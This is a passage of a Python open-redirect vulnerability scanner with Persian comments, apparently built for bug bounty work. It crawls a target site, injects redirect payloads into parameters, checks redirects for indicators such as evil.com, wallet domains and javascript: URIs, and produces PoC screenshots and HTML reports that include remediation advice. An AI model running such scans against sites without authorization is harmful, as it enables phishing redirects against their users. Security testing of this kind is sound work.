                await asyncio.sleep(0.1)
        
        self.vulnerabilities = vulnerabilities
        self.logger.info(f"Testing completed. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
    
    async def test_parameter_with_payload(self, param: Parameter, payload: str) -> Optional[Vulnerability]:
        """تست پارامتر با payload"""
        try:
            # Construct test URL
            test_url = self.construct_test_url(param, payload)
            
            # Test with HTTP request
            async with self.session.get(test_url, allow_redirects=False) as response:
                # Check for redirect responses
                if response.status in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    if self.is_successful_redirect(location, payload):
                        # Calculate metrics
                        confidence = param.confidence + 0.2
                        impact = self.assess_impact(location, payload)
                        remediation = self.suggest_remediation(param.context)
                        
                        # Take screenshot
                        screenshot_path = await self.take_screenshot(test_url)
                        
                        return Vulnerability(
                            url=test_url,
                            parameter=param.name,
                            payload=payload,
                            method=param.method,
                            response_code=response.status,
                            redirect_url=location,
                            context=param.context,
                            screenshot_path=screenshot_path,
                            timestamp=datetime.now().isoformat(),
                            vulnerability_type="open_redirect",
                            confidence=min(confidence, 1.0),
                            impact=impact,
                            remediation=remediation
                        )
                
                # Check for DOM-based redirects
                content = await response.text()
                dom_vuln = self.check_dom_based_redirect(content, test_url, param, payload)
                if dom_vuln:
                    return dom_vuln
                    
        except Exception as e:
            self.logger.debug(f"Error testing {param.name}: {e}")
        
        return None
    
    def construct_test_url(self, param: Parameter, payload: str) -> str:
        """ساخت URL تست"""
        parsed = urlparse(param.url)
        
        if param.context == 'query':
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            query_params[param.name] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        elif param.context == 'fragment':
            return f"{param.url.split('#')[0]}#{param.name}={quote(payload)}"
        
        else:
            separator = '&' if '?' in param.url else '?'
            return f"{param.url}{separator}{param.name}={quote(payload)}"
    
    def is_successful_redirect(self, location: str, payload: str) -> bool:
        """بررسی موفقیت redirect"""
        if not location:
            return False
        
        location_lower = location.lower()
        decoded_location = unquote(location).lower()
        
        # Check for test domains
        test_indicators = [
            'google.com', 'evil.com', 'example.com', 'metamask.io',
            'wallet.connect', 'uniswap.org', '216.58.214.206'
        ]
        
        for indicator in test_indicators:
            if indicator in location_lower or indicator in decoded_location:
                return True
        
        # Check for JavaScript execution
        if location_lower.startswith('javascript:') and ('confirm' in location_lower or 'prompt' in location_lower):
            return True
        
        return False
    
    def check_dom_based_redirect(self, content: str, test_url: str, param: Parameter, payload: str) -> Optional[Vulnerability]:
        """بررسی DOM-based redirect"""
        # DOM redirect patterns
        dom_patterns = [
            r'location\.href\s*=\s*([^;]+)',
            r'window\.location\s*=\s*([^;]+)',
            r'document\.location\s*=\s*([^;]+)',
        ]
        
        for pattern in dom_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if param.name in match or payload in match:
                    return Vulnerability(
                        url=test_url,
                        parameter=param.name,
                        payload=payload,
                        method=param.method,
                        response_code=200,
                        redirect_url=match,
                        context=param.context,
                        timestamp=datetime.now().isoformat(),
                        vulnerability_type="dom_based_redirect",
                        confidence=0.8,
                        impact="HIGH",
                        remediation="Sanitize user input before DOM manipulation"
                    )
        
        return None
    
    def assess_impact(self, redirect_url: str, payload: str) -> str:
        """ارزیابی تأثیر آسیب‌پذیری"""
        if redirect_url.startswith('javascript:'):
            return "CRITICAL"
        elif redirect_url.startswith(('http://', 'https://')):
            redirect_domain = urlparse(redirect_url).netloc
            if redirect_domain != self.base_domain:
                return "HIGH"
        return "MEDIUM"
    
    def suggest_remediation(self, context: str) -> str:
        """پیشنهاد رفع آسیب‌پذیری"""
        remediations = {
            'query': "Validate URL parameters against allowlist of permitted domains",
            'fragment': "Implement client-side validation for fragment parameters",
            'form_input': "Validate form inputs server-side before processing",
            'javascript': "Sanitize user input before JavaScript redirects",
            'web3_config': "Validate Web3 URLs against trusted provider list"
        }
        return remediations.get(context, "Implement proper input validation and use allowlist approach")
    
    async def take_screenshot(self, url: str) -> Optional[str]:
        """عکس‌برداری برای PoC"""
        if not self.driver or not SELENIUM_AVAILABLE:
            return None
        
        try:
            # Create screenshots directory
            screenshots_dir = Path("screenshots")
            screenshots_dir.mkdir(exist_ok=True)
            
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
            filename = f"poc_{timestamp}_{url_hash}.png"
            screenshot_path = screenshots_dir / filename
            
            # Take screenshot
            self.driver.get(url)
            await asyncio.sleep(2)
            self.driver.save_screenshot(str(screenshot_path))
            
            self.logger.info(f"📸 Screenshot saved: {screenshot_path}")
            return str(screenshot_path)
            
        except Exception as e:
            self.logger.error(f"Screenshot failed: {e}")
            return None
    
    def save_parameters(self, filename: str = "parameters.json"):
        """ذخیره تمام پارامترها"""
        params_data = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_date': datetime.now().isoformat(),
                'total_parameters': len(self.parameters),
                'redirect_parameters': len([p for p in self.parameters if p.is_redirect_related]),
                'vulnerabilities_found': len(self.vulnerabilities)
            },
            'parameters': [asdict(param) for param in self.parameters],
            'vulnerabilities': [asdict(vuln) for vuln in self.vulnerabilities]
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(params_data, f, indent=2, ensure_ascii=False)
        
        self.logger.info(f"💾 Parameters saved to {filename}")
        
        # Save CSV for analysis
        self.save_parameters_csv()
    
    def save_parameters_csv(self):
        """ذخیره پارامترها در فرمت CSV"""
        csv_filename = "parameters_analysis.csv"
        
        with open(csv_filename, 'w', newline='', encoding='utf-8') as csvfile:
            fieldnames = ['name', 'value', 'source', 'context', 'url', 'is_redirect_related', 'confidence', 'vulnerability_found']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            
            vuln_params = {v.parameter for v in self.vulnerabilities}
            
            for param in self.parameters:
                writer.writerow({
                    'name': param.name,
                    'value': param.value[:100],
                    'source': param.source,
                    'context': param.context,
                    'url': param.url,
                    'is_redirect_related': param.is_redirect_related,
                    'confidence': param.confidence,
                    'vulnerability_found': param.name in vuln_params
                })
        
        self.logger.info(f"📊 CSV analysis saved to {csv_filename}")
    
    def generate_html_report(self, output_file: str = "open_redirect_report.html"):
        """تولید گزارش HTML حرفه‌ای"""
        
        # Calculate statistics
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        high_conf_params = [p for p in self.parameters if p.confidence > 0.7]
        
        # Group vulnerabilities by impact
        impact_counts = {}
        for vuln in self.vulnerabilities:
            impact_counts[vuln.impact] = impact_counts.get(vuln.impact, 0) + 1
        
        html_content = f"""
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>گزارش آسیب‌پذیری Open Redirect</title>
    <style>
        body {{ font-family: 'Tahoma', 'Arial', sans-serif; margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #d32f2f 0%, #f44336 100%); color: white; padding: 30px; text-align: center; }}
        .header h1 {{ margin: 0; font-size: 2.5em; }}
        .content {{ padding: 30px; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .summary-card {{ background: #f8f9fa; border-radius: 8px; padding: 20px; text-align: center; border-right: 4px solid #2196f3; }}
        .summary-card h3 {{ margin: 0 0 10px 0; color: #333; }}
        .summary-card .number {{ font-size: 2em; font-weight: bold; color: #2196f3; }}
        .vulnerability {{ background: #ffebee; border-radius: 8px; padding: 20px; margin-bottom: 20px; border-right: 6px solid #f44336; }}
        .vulnerability.critical {{ border-right-color: #d32f2f; background: #fce4ec; }}
        .vulnerability.high {{ border-right-color: #f44336; }}
        .vulnerability.medium {{ border-right-color: #ff9800; background: #fff3e0; }}
        .parameter {{ background: #f3e5f5; border-radius: 6px; padding: 15px; margin-bottom: 15px; border-right: 4px solid #9c27b0; }}
        .parameter.redirect {{ border-right-color: #f44336; background: #ffebee; }}
        .code {{ background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 6px; font-family: monospace; overflow-x: auto; }}
        .success {{ color: #4caf50; font-weight: bold; }}
        .warning {{ color: #ff9800; font-weight: bold; }}
        .error {{ color: #f44336; font-weight: bold; }}
        .critical {{ color: #d32f2f; font-weight: bold; }}
        .screenshot {{ max-width: 100%; border-radius: 8px; margin: 10px 0; }}
        .metadata {{ font-size: 0.9em; color: #666; margin-top: 10px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 گزارش آسیب‌پذیری Open Redirect</h1>
            <p>اسکنر حرفه‌ای امنیت وب</p>
        </div>
        
        <div class="content">
            <div class="summary">
                <div class="summary-card">
                    <h3>هدف</h3>
                    <div class="number">{self.base_domain}</div>
                </div>
                <div class="summary-card">
                    <h3>URL های خزش شده</h3>
                    <div class="number">{len(self.discovered_urls)}</div>
                </div>
                <div class="summary-card">
                    <h3>پارامترهای کشف شده</h3>
                    <div class="number">{len(self.parameters)}</div>
                </div>
                <div class="summary-card">
                    <h3>پارامترهای Redirect</h3>
                    <div class="number">{len(redirect_params)}</div>
                </div>
                <div class="summary-card">
                    <h3>آسیب‌پذیری‌ها</h3>
                    <div class="number {'error' if len(self.vulnerabilities) > 0 else 'success'}">{len(self.vulnerabilities)}</div>
                </div>
                <div class="summary-card">
                    <h3>فایل‌های JS</h3>
                    <div class="number">{len(self.js_files)}</div>
                </div>
            </div>
"""
        
        # Add vulnerabilities section
        if self.vulnerabilities:
            html_content += """
            <h2>🚨 آسیب‌پذیری‌های کشف شده</h2>
"""
            for i, vuln in enumerate(self.vulnerabilities, 1):
                html_content += f"""
            <div class="vulnerability {vuln.impact.lower()}">
                <h3>آسیب‌پذیری #{i}: {vuln.vulnerability_type}</h3>
                <p><strong>URL:</strong> <code>{vuln.url}</code></p>
                <p><strong>پارامتر:</strong> <code>{vuln.parameter}</code></p>
                <p><strong>Payload:</strong></p>
                <div class="code">{vuln.payload}</div>
                <p><strong>Response Code:</strong> {vuln.response_code}</p>
                <p><strong>Redirect URL:</strong> <code>{vuln.redirect_url}</code></p>
                <p><strong>تأثیر:</strong> <span class="{vuln.impact.lower()}">{vuln.impact}</span></p>
                <p><strong>اعتماد:</strong> {vuln.confidence:.1%}</p>
                <p><strong>راه حل:</strong> {vuln.remediation}</p>
"""
                if vuln.screenshot_path:
                    html_content += f"""
                <div>
                    <h4>📸 عکس اثبات مفهوم:</h4>
                    <img src="{vuln.screenshot_path}" alt="PoC Screenshot" class="screenshot">
                </div>
"""
                html_content += f"""
                <div class="metadata">زمان: {vuln.timestamp} | Context: {vuln.context}</div>
            </div>
"""
        else:
            html_content += """
            <div style="text-align: center; padding: 40px; background: #e8f5e8; border-radius: 8px;">
                <h2 class="success">✅ هیچ آسیب‌پذیری Open Redirect یافت نشد</h2>
                <p>برنامه هدف به درستی در برابر حملات Open Redirect محافظت شده است.</p>
            </div>
"""
        
        # Add parameters section
        html_content += f"""
            <h2>🔍 پارامترهای کشف شده</h2>
            <p><strong>مجموع پارامترها:</strong> {len(self.parameters)}</p>
            <p><strong>مرتبط با Redirect:</strong> {len(redirect_params)}</p>
            <p><strong>اعتماد بالا:</strong> {len(high_conf_params)}</p>
            
            <h3>🎯 پارامترهای اولویت بالا</h3>
"""
        
        priority_params = redirect_params + high_conf_params
        for param in priority_params[:10]:  # Show first 10
            redirect_class = "redirect" if param.is_redirect_related else ""
            html_content += f"""
            <div class="parameter {redirect_class}">
                <h4>{param.name} {'(مرتبط با Redirect)' if param.is_redirect_related else ''}</h4>
                <p><strong>مقدار:</strong> <code>{param.value[:100]}{'...' if len(param.value) > 100 else ''}</code></p>
                <p><strong>منبع:</strong> {param.source} | <strong>Context:</strong> {param.context}</p>
                <p><strong>URL:</strong> <code>{param.url}</code></p>
                <p><strong>اعتماد:</strong> {param.confidence:.1%}</p>
            </div>
"""
        
        html_content += f"""
            <div class="metadata" style="text-align: center; margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd;">
                <p><strong>گزارش تولید شده توسط اسکنر حرفه‌ای Open Redirect v2.0</strong></p>
                <p>تاریخ اسکن: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            </div>
        </div>
    </div>
</body>
</html>
"""
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        self.logger.info(f"📄 HTML report generated: {output_file}")
    
    async def run_complete_scan(self):
        """اجرای اسکن کامل"""
        start_time = time.time()
        self.logger.info("🚀 Starting Professional Open Redirect Scanner")
        
        try:
            # راه‌اندازی
            await self.init_session()
            self.init_driver()
            
            # مرحله 1: خزش عمیق
            self.logger.info("مرحله 1: خزش عمیق و استخراج پارامتر")
            await self.crawl_website()
            
            # مرحله 2: تحلیل پارامترها
            self.logger.info("مرحله 2: تحلیل پارامترهای redirect")
            redirect_params = [p for p in self.parameters if p.is_redirect_related]
            
            # مرحله 3: تست آسیب‌پذیری
            self.logger.info("مرحله 3: تست آسیب‌پذیری‌های Open Redirect")
            await self.test_vulnerabilities()
            
            # مرحله 4: ذخیره نتایج
            self.logger.info("مرحله 4: تولید گزارش‌ها")
            self.save_parameters()
            self.generate_html_report()
            
            # خلاصه نهایی
            scan_duration = time.time() - start_time
            self.logger.info("🎯 خلاصه اسکن:")
            self.logger.info(f"   مدت زمان: {scan_duration:.2f} ثانیه")
            self.logger.info(f"   URL های خزش شده: {len(self.discovered_urls)}")
            self.logger.info(f"   پارامترهای کشف شده: {len(self.parameters)}")
            self.logger.info(f"   پارامترهای Redirect: {len(redirect_params)}")
            self.logger.info(f"   آسیب‌پذیری‌های یافت شده: {len(self.vulnerabilities)}")
            
            if self.vulnerabilities:
                self.logger.info("🚨 آسیب‌پذیری‌ها:")
                for vuln in self.vulnerabilities:
                    self.logger.info(f"   • {vuln.parameter} -> {vuln.payload} ({vuln.impact})")
            else:
                self.logger.info("✅ هیچ آسیب‌پذیری یافت نشد")
            
            print("\n" + "="*60)
            print("🎉 اسکن با موفقیت تکمیل شد!")
            print(f"📄 گزارش HTML: open_redirect_report.html")
            print(f"💾 داده‌های JSON: parameters.json") 
            print(f"📊 تحلیل CSV: parameters_analysis.csv")
            if self.vulnerabilities and SELENIUM_AVAILABLE:
                print(f"📸 عکس‌های PoC: screenshots/")
            print("="*60)
            
        except Exception as e:
            self.logger.error(f"Scan failed: {e}")
            raise
        finally:
            if self.session:
                await self.session.close()
            if self.driver:
                self.driver.quit()


def print_banner():
    """نمایش banner حرفه‌ای"""
    banner = """
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║    🔍 Professional Open Redirect Vulnerability Scanner 🔍             ║
║                                                                       ║
║    ✨ ویژگی‌ها:                                                      ║
║    • خزش عمیق با رندر JavaScript                                     ║
║    • تحلیل پیشرفته فایل‌های JS                                       ║
║    • تشخیص DOM-based vulnerability                                   ║
║    • پشتیبانی Web3 و Blockchain                                     ║
║    • تزریق payload هوشمند بر اساس context                           ║
║    • عکس‌برداری خودکار PoC                                           ║
║    • گزارش‌دهی حرفه‌ای                                               ║
║                                                                       ║
║    🎯 طراحی شده برای Bug Bounty Hunter ها                           ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
"""
    print(banner)


def show_usage():
    """نمایش راهنمای استفاده"""
    print("📖 نحوه استفاده:")
    print("="*50)
    print("# اسکن ساده:")
    print("python3 open_redirect_pro.py https://target.com")
    print("")
    print("# اسکن پیشرفته:")
    print("python3 open_redirect_pro.py https://target.com --depth 4 --max-pages 300 --verbose")
    print("")
    print("# نمایش راهنما:")
    print("python3 open_redirect_pro.py --help")
    print("")


def check_dependencies():
    """بررسی وابستگی‌ها"""
    print("🔍 بررسی وابستگی‌ها...")
    
    missing_deps = []
    
    # Check aiohttp
    try:
        import aiohttp
        print("✅ aiohttp")
    except ImportError:
        missing_deps.append("aiohttp")
        print("❌ aiohttp")
    
    # Check optional dependencies
    if not SELENIUM_AVAILABLE:
        print("⚠️  selenium (عکس‌برداری غیرفعال)")
    else:
        print("✅ selenium")
    
    if not BS4_AVAILABLE:
        print("⚠️  beautifulsoup4 (تحلیل HTML ساده)")
    else:
        print("✅ beautifulsoup4")
    
    if not JS_ANALYSIS_AVAILABLE:
        print("⚠️  esprima/jsbeautifier (تحلیل JS با regex)")
    else:
        print("✅ esprima & jsbeautifier")
    
    if missing_deps:
        print(f"\n📦 برای نصب وابستگی‌های لازم:")
        print(f"pip3 install {' '.join(missing_deps)}")
        print("pip3 install selenium beautifulsoup4 esprima jsbeautifier")
    
    return len(missing_deps) == 0


async def main():
    """تابع اصلی"""
    print_banner()
    
    parser = argparse.ArgumentParser(description='اسکنر حرفه‌ای آسیب‌پذیری Open Redirect')
    parser.add_argument('target', nargs='?', help='URL هدف برای اسکن')
    parser.add_argument('--depth', type=int, default=3, help='حداکثر عمق خزش (پیش‌فرض: 3)')
    parser.add_argument('--max-pages', type=int, default=100, help='حداکثر صفحات خزش (پیش‌فرض: 100)')
    parser.add_argument('--output', default='open_redirect_report.html', help='نام فایل گزارش')
    parser.add_argument('--verbose', '-v', action='store_true', help='نمایش جزئیات')
    parser.add_argument('--check-deps', action='store_true', help='بررسی وابستگی‌ها')
    parser.add_argument('--demo', action='store_true', help='نمایش نمونه')
    
    args = parser.parse_args()
    
    # Check dependencies
    if args.check_deps:
        check_dependencies()
        return
    
    # Show demo
    if args.demo:
        show_usage()
        print("\n🎯 نمونه پیلودها:")
        scanner = OpenRedirectPro("https://example.com")
        for i, payload in enumerate(scanner.payloads[:10], 1):
            print(f"   {i}. {payload}")
        print(f"   ... و {len(scanner.payloads) - 10} پیلود دیگر")
        return
    
    # Validate target
    if not args.target:
        print("❌ لطفاً URL هدف را وارد کنید")
        show_usage()
        return
    
    # Normalize URL
    if not args.target.startswith(('http://', 'https://')):
        args.target = f"https://{args.target}"
    
    # Setup logging
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Check basic dependencies
    has_aiohttp = check_dependencies()
    if not has_aiohttp:
        print("\n❌ وابستگی‌های اصلی موجود نیست. لطفاً نصب کنید:")
        print("pip3 install aiohttp")
        return
    
    print(f"\n🎯 شروع اسکن: {args.target}")
    print(f"📊 تنظیمات: عمق {args.depth}, حداکثر {args.max_pages} صفحه")
    
    # Create and run scanner
    scanner = OpenRedirectPro(args.target, args.depth, args.max_pages)
    await scanner.run_complete_scan()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 اسکن توسط کاربر متوقف شد")
    except Exception as e:
        print(f"❌ خطا در اسکن: {e}")
        logging.error(f"Fatal error: {e}", exc_info=True)